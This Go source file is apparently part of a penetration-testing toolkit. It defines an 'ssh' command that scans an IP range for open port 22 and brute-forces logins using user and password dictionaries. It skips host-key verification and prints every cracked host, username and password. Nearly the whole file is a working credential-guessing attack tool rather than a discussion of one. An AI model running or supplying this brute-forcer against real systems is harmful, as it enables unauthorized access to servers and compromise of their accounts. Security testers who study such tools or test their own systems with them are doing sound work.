package cmd

import (
	"demo/config"
	"demo/pkg/logger"
	"flag"
	"fmt"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// sshCmd represents the ssh command
var sshCmd = &cobra.Command{
	Use:   "ssh",
	Short: "ssh弱口令爆破账户/密码",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("\033[1;31;40m%s\033[0m\n","正在进行ssh弱口令爆破...")
		flag.Parse()
		start := time.Now()
		Choice()
		ips := SurvivalHost
		var aliveIps []string
		for _, ip := range ips {
			if checkAlive(ip) {
				aliveIps = append(aliveIps, ip)
			}
		}
		users :=  config.Userdict["ssh"]
		passwords := config.Passwords
		for _, user := range users {
			for _, password := range passwords {
				for _, ip := range aliveIps {
					success, _ := sshLogin(ip, user, password)
					if success == true {
						log.Println(logger.LightGreen(ip+" "+user+" "+password+" "+logger.LightGreen(success)))
					}else {
						log.Println(ip, user, password, success)
					}
					if success {
						c:=fmt.Sprintf("破解%v成功，用户名是%v,密码是%v\n", ip, user, password)
						fmt.Println(logger.LightBlue(c))
					}
				}
			}
		}
		defer func() {
			elapsed := time.Since(start)
			fmt.Println(elapsed)
		}()
	},
}
func init() {
	rootCmd.AddCommand(sshCmd)
	sshCmd.Flags().StringVarP(&Hosts, "hosts", "H", "", "设置你要ssh弱口令爆破的主机")
}

func Choice() {
	flag.Parse()

	cha := make(chan int, 512)
	var wg sync.WaitGroup
	ip:= Hosts
	if ip == "" {
		fmt.Println("Please set a -H Parameter")
		fmt.Println("You may be need help (-h/-help")
		os.Exit(0)
	}

	a := Hosts
	s := strings.Split(a, ".")
	b := s[0] + "." + s[1] + "." + s[2] + "."
	for i := 0; i < cap(cha); i++ {
		go sshs(b, cha, &wg)
	}

	o := strings.Contains(a,"-")
	if strings.Contains(a, "/24"){
		for i := 1; i <= 255; i++ {
			wg.Add(1)
			cha <- i
		}
	}else if o{
		v := strings.Split(s[3],"-")
		j1, _ := strconv.Atoi(v[0])
		j2, _ := strconv.Atoi(v[1])
		for j := j1; j <= j2; j++{
			wg.Add(1)
			cha <- j
		}
	}else {
		a4,_ := strconv.Atoi(s[3])
		wg.Add(1)
		//fmt.Println(a4)
		cha <- a4
	}
	wg.Wait()
	close(cha)
}

func sshs(b string, cha chan int, wg *sync.WaitGroup) {
	for p := range cha {
		//p 1-255 数字
		address := fmt.Sprintf("%s%d", b,p)
		SurvivalHost=append(SurvivalHost,address )
		wg.Done()
	}
}

func checkAlive(ip string) bool {
	alive := false
	_, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, "22"), 1*time.Second)
	if err == nil {
		alive = true
	}
	return alive
}

func sshLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         1 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo '123'")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}